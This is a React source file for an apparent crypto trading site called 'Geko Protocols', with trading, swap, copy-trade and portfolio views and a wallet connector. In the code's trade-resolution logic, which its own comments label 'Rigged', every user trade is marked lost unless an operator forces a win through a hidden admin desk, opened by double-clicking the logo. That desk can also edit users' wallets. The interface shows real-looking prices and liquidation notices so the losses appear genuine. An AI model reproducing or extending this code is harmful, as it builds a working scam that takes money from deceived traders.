
import React, { useState, useEffect, useMemo } from 'react';
import { AssetInfo, MarketData, WalletData, ActiveTrade, LiveTx } from './types';
import SwapView from './components/SwapView';
import TradeView from './components/TradeView';
import GraphsView from './components/GraphsView';
import { PortfolioView } from './components/PortfolioView';
import { ConnectWallet, ConnectMode } from './components/ConnectWallet';
import { CopyTradeView } from './components/CopyTradeView';
import { SupportWidget } from './components/SupportWidget';
import WalletDashboard from './components/WalletDashboard';
import AdminDesk from './components/AdminDesk';
import { LandingPage } from './components/LandingPage';
import { SystemGuardian } from './components/SystemGuardian';
import { fetchRealPrices, fetchCandles } from './services/marketData';
import { authService } from './services/authService';
import { audioSynth } from './services/audioSynth';
import { configService } from './services/configService';
import { universalWallet } from './services/universalWallet';

type ViewMode = 'trade' | 'swap' | 'graphs' | 'portfolio' | 'copy' | 'referral';

const generateMockAssets = (): AssetInfo[] => [
  { symbol: 'BTC', name: 'Bitcoin', price: 82929.94, change24h: 1.45, marketCap: '1.6T', volume24h: '38B' },
  { symbol: 'ETH', name: 'Ethereum', price: 2950.12, change24h: 0.85, marketCap: '350B', volume24h: '15B' },
  { symbol: 'SOL', name: 'Solana', price: 168.45, change24h: 4.12, marketCap: '78B', volume24h: '4.5B' },
  { symbol: 'DOT', name: 'Polkadot', price: 6.80, change24h: -1.20, marketCap: '9B', volume24h: '180M' },
  { symbol: 'USDT', name: 'Tether', price: 1.00, change24h: 0.01, marketCap: '103B', volume24h: '45B' },
];

const App: React.FC = () => {
  const [booting, setBooting] = useState(true);
  const [activeView, setActiveView] = useState<ViewMode>('trade'); 
  const [assets, setAssets] = useState<AssetInfo[]>(generateMockAssets());
  const [selectedSymbol, setSelectedSymbol] = useState<string>('BTC');
  const [marketData, setMarketData] = useState<MarketData[]>([]);
  
  const [activeTrades, setActiveTrades] = useState<ActiveTrade[]>([]);
  const [notification, setNotification] = useState<{ type: 'Win' | 'Loss' | 'System', msg: string } | null>(null);
  
  const [adminDeskOpen, setAdminDeskOpen] = useState(false);
  const [wallet, setWallet] = useState<(WalletData & { email?: string }) | null>(null);
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [isDashboardOpen, setIsDashboardOpen] = useState(false);
  
  const [depositAddress, setDepositAddress] = useState("");
  const [isMaintenance, setIsMaintenance] = useState(false);

  const isConnected = !!wallet;
  const selectedAsset = useMemo(() => assets.find(a => a.symbol === selectedSymbol) || assets[0], [assets, selectedSymbol]);

  useEffect(() => {
    const boot = async () => {
        audioSynth.playBoot();
        await new Promise(r => setTimeout(r, 1200));
        setBooting(false);
    };
    boot();
  }, []);

  // Price Sync
  useEffect(() => {
    const syncPrices = async () => {
      const realPrices = await fetchRealPrices();
      setAssets(prev => prev.map(a => {
        const update = realPrices[a.symbol];
        return update ? { ...a, price: update.price, change24h: update.change } : a;
      }));
    };
    syncPrices();
    const interval = setInterval(syncPrices, 5000);
    return () => clearInterval(interval);
  }, []);

  // Rigged Resolution Engine for User Trades
  useEffect(() => {
    const resolutionInterval = setInterval(() => {
      const now = Date.now();
      setActiveTrades(prev => {
        const needsResolving = prev.filter(t => (now - t.startTime) / 1000 >= t.duration && t.status === 'pending');
        if (needsResolving.length === 0) return prev;

        return prev.map(t => {
          if (t.status !== 'pending' || (now - t.startTime) / 1000 < t.duration) return t;

          // Rigged Logic: Defaults to loss unless Admin forces win
          const finalStatus = t.forceOutcome === 'win' ? 'won' : 'lost';
          
          if (finalStatus === 'won') {
             setNotification({ type: 'Win', msg: `ORDER CLEARED: +$${t.amount} PnL` });
             audioSynth.playSuccess();
          } else {
             setNotification({ type: 'Loss', msg: `ORDER LIQUIDATED: -$${t.amount} PnL` });
             audioSynth.playError();
          }
          return { ...t, status: finalStatus };
        });
      });
    }, 1000);
    return () => clearInterval(resolutionInterval);
  }, []);

  useEffect(() => {
    const loadCandles = async () => {
        const candles = await fetchCandles(selectedSymbol);
        setMarketData(candles);
    };
    loadCandles();
  }, [selectedSymbol]);

  const handleWalletConnect = async (data: WalletData | string, email?: string) => {
    let freshWallet: WalletData;
    if (typeof data === 'string') {
      const balances = await universalWallet.fetchAddressBalance(data);
      const chainType = data.startsWith('0x') ? 'evm' : 'svm';
      freshWallet = { address: data, source: 'Manual Entry', chainType, balances, history: [], protocolBalances: [] };
    } else { freshWallet = data; }
    authService.saveSession({ ...freshWallet, email });
    setWallet({ ...freshWallet, email });
    setIsWalletModalOpen(false);
  };

  const handlePlaceTrade = (trade: { direction: 'up' | 'down', amount: string, duration: number }) => {
      const newTrade: ActiveTrade = {
          id: `trade-${Date.now()}`,
          symbol: selectedSymbol,
          userName: 'Local_Node',
          direction: trade.direction,
          amount: trade.amount,
          entryPrice: selectedAsset.price,
          startTime: Date.now(),
          duration: trade.duration,
          status: 'pending',
          isBot: false,
          forceOutcome: 'loss'
      };
      setActiveTrades(prev => [newTrade, ...prev]);
      audioSynth.playPing();
  };

  const handleUpdateTrade = (id: string, updates: Partial<ActiveTrade>) => {
      setActiveTrades(prev => prev.map(t => t.id === id ? { ...t, ...updates } : t));
  };

  if (booting) return (
      <div className="fixed inset-0 bg-[#0B0E11] z-[9999] flex flex-col items-center justify-center p-8 text-indigo-500 font-mono">
          <div className="text-4xl font-black italic mb-8 animate-pulse uppercase tracking-tighter">Geko Protocols</div>
          <div className="w-64 h-1 bg-gray-900 rounded-full overflow-hidden">
              <div className="h-full bg-indigo-500 animate-loading"></div>
          </div>
      </div>
  );

  if (!isConnected) return (
      <>
        <LandingPage onLoginSuccess={setWallet} onConnectWalletClick={() => setIsWalletModalOpen(true)} />
        {isWalletModalOpen && <ConnectWallet onConnect={handleWalletConnect} onClose={() => setIsWalletModalOpen(false)} />}
      </>
  );

  return (
    <SystemGuardian>
      <div className="flex h-screen bg-[#0B0E11] text-gray-100 font-sans overflow-hidden bg-grid">
        <aside className="w-20 bg-[#181C25] border-r border-[#2B3139] flex flex-col items-center py-6 shrink-0">
          <div className="mb-10 cursor-pointer" onDoubleClick={() => setAdminDeskOpen(true)}>
             <div className="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center shadow-lg hover:rotate-90 transition-transform">
               <span className="font-black italic text-xl text-white">G</span>
             </div>
          </div>
          <nav className="flex-1 space-y-4 px-3">
            {['trade', 'swap', 'copy', 'graphs', 'portfolio'].map(id => (
                <button key={id} onClick={() => setActiveView(id as ViewMode)} className={`p-3 rounded-xl transition-all ${activeView === id ? 'bg-[#2B3139] text-indigo-400 shadow-inner' : 'text-gray-500 hover:text-white'}`}>
                    <div className="w-6 h-6 border-2 border-current rounded-md flex items-center justify-center text-[10px] font-black">{id[0].toUpperCase()}</div>
                </button>
            ))}
          </nav>

          <div className="mt-auto flex flex-col items-center space-y-4 mb-2">
            <div className="flex flex-col items-center group cursor-help">
                <div className="w-8 h-8 rounded-lg bg-[#0B0E11] border border-[#2B3139] flex items-center justify-center text-gray-600 group-hover:text-indigo-500 group-hover:border-indigo-500 transition-all">
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.43.372.823 1.102.823 2.222 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
                </div>
                <div className="mt-1 flex items-center space-x-1">
                    <div className="w-1 h-1 rounded-full bg-emerald-500 animate-pulse"></div>
                    <span className="text-[7px] font-black text-emerald-500 uppercase">Synced</span>
                </div>
            </div>
            <button onClick={() => setIsDashboardOpen(true)} className="w-10 h-10 rounded-full bg-indigo-600 border-2 border-[#0B0E11] text-xs font-black hover:scale-110 transition-transform shadow-lg shadow-indigo-600/30">U</button>
          </div>
        </aside>

        <main className="flex-1 flex flex-col min-w-0 bg-transparent relative overflow-hidden">
            <div className="flex-1 overflow-hidden relative">
                {activeView === 'trade' && (
                  <TradeView 
                    assets={assets} 
                    selectedAsset={selectedAsset} 
                    selectedSymbol={selectedSymbol} 
                    setSelectedSymbol={setSelectedSymbol} 
                    marketData={marketData} 
                    isConnected={true} 
                    onPlaceTrade={handlePlaceTrade}
                    activeTrades={activeTrades}
                  />
                )}
                {activeView === 'swap' && <SwapView assets={assets} isConnected={true} onConnect={() => setIsDashboardOpen(true)} onSignUp={() => {}} onConfirm={(i, c) => c()} onSwap={() => {}} onDeposit={() => {}} />}
                {activeView === 'copy' && <CopyTradeView onMirror={() => {}} />}
                {activeView === 'graphs' && <GraphsView assets={assets} selectedAsset={selectedAsset} marketData={marketData} setSelectedSymbol={setSelectedSymbol} />}
                {activeView === 'portfolio' && <PortfolioView wallet={wallet} assets={assets} depositAddress={depositAddress} onConnect={() => setIsDashboardOpen(true)} onDisconnect={() => setWallet(null)} onUpdateWallet={setWallet} onRefreshBalances={() => {}} />}
            </div>

            {notification && (
              <div className={`fixed top-6 left-1/2 -translate-x-1/2 z-[100] px-6 py-4 bg-[#181C25] border rounded-2xl animate-in fade-in slide-in-from-top-2 shadow-2xl flex items-center space-x-3 ${notification.type === 'Win' ? 'border-emerald-500/30 text-emerald-400' : notification.type === 'Loss' ? 'border-rose-500/30 text-rose-400' : 'border-indigo-500/30 text-indigo-400'}`}>
                  <div className={`w-2 h-2 rounded-full animate-pulse ${notification.type === 'Win' ? 'bg-emerald-500' : notification.type === 'Loss' ? 'bg-rose-500' : 'bg-indigo-500'}`}></div>
                  <span className="text-[10px] font-black uppercase tracking-widest">{notification.msg}</span>
                  <button onClick={() => setNotification(null)} className="ml-4 text-[10px] font-black">×</button>
              </div>
            )}
        </main>

        <SupportWidget />
        {isDashboardOpen && wallet && <WalletDashboard wallet={wallet} onClose={() => setIsDashboardOpen(false)} onDisconnect={() => setWallet(null)} />}
        {adminDeskOpen && <AdminDesk managedWallet={wallet} onClose={() => setAdminDeskOpen(false)} activeTrades={activeTrades} onForceOutcome={handleUpdateTrade} onUpdateWallet={setWallet} />}
      </div>
    </SystemGuardian>
  );
};

export default App;
